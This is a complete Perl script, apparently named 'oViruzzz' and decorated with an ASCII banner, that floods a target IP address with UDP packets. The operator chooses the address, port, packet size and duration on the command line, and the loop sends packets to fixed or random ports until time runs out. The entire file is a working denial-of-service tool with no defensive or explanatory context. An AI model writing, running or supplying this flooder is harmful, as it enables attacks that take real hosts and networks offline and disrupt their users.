#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

##############
# oViruzzz
##############

use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize,$pport);
$iaddr = inet_aton("$ip") or die "Cannot connect to $ip\n";
$endtime = time() + ($time ? $time : 1000000);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;
      d8b                         d8b                            
      88P                         88P                            
     d88                         d88                             
 d888888    88bd88b  .d888b, d888888    88bd88b d8888b ?88,.d88b,
d8P' ?88    88P' ?8b ?8b,   d8P' ?88    88P'  `d8P' ?88`?88'  ?88
88b  ,88b  d88   88P   `?8b 88b  ,88b  d88     88b  d88  88b  d8P
`?88P'`88bd88'   88b`?888P' `?88P'`88bd88'     `?8888P'  888888P'
                                                         88P'    
                                                         d88      
                                                         ?8P                                                                                                                                                                                   
EOTEXT

print "~To cancel the attack press \'Ctrl-C\'\n\n";
print "|DNS|\t\t |Port|\t\t |Power|\t\t |Time|\n";
print "|$ip|\t |$port|\t\t |$size|\t\t |$time|\n";
print "To cancel the attack press 'Ctrl-C'\n" unless $time;

for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;

  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));} 